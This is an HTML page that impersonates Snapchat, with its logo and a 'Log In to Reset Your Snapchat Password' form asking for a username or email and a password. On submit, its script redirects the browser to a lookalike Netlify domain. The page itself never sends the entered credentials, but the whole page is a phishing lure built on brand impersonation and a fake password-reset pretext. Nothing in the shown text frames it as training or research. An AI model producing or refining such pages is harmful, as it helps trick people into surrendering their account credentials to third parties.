<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Log In - Snapchat Password Reset</title>
    <link rel="stylesheet" href="index.css"> <!-- Link to your CSS file -->
    <style>
        .error-message {
            color: red;
            margin-top: 5px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="form">
        <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" alt="Snapchat Logo" class="snapchat-logo">
        <h1>Log In to Reset Your Snapchat Password</h1>
        <form id="loginForm">
            <label for="username">Username or Email Address:</label><br>
            <input type="text" id="username" name="username" placeholder="Enter your username or email" required><br><br>
            
            <label for="password">Password:</label><br>
            <input type="password" id="password" name="password" placeholder="Enter your password" required><br><br>
            
            <input type="submit" value="Log In">
            <span id="loginError" class="error-message"></span><br>
        </form>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent form submission
            
            // Always redirect to password reset page (for demonstration purposes)
            window.location.href = "https://snapchatpasswordreset.netlify.app/reset_password.html";
        });
    </script>
</body>
</html>
